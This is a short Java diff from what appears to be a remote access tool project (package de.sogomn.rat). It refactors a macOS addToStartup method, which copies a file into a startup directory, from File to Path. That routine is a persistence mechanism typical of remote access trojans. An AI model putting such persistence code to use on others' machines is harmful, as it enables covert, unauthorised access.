@@ -5,6 +5,8 @@
 package de.sogomn.rat.service;
 
 import java.io.File;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 
 import de.sogomn.engine.util.FileUtils;
 
@@ -32,9 +34,9 @@ public final class MacService implements IOperatingSystemService {
 	}
 	
 	@Override
-	public void addToStartup(final File file) {
-		final String path = STARTUP_DIRECTORY_PATH + File.separator + file.getName();
-		final File destination = new File(path);
+	public void addToStartup(final Path file) {
+		final String path = STARTUP_DIRECTORY_PATH + File.separator + file.getFileName().toString();
+		final Path destination = Paths.get(path);
 		
 		FileUtils.copyFile(file, destination);
 	}
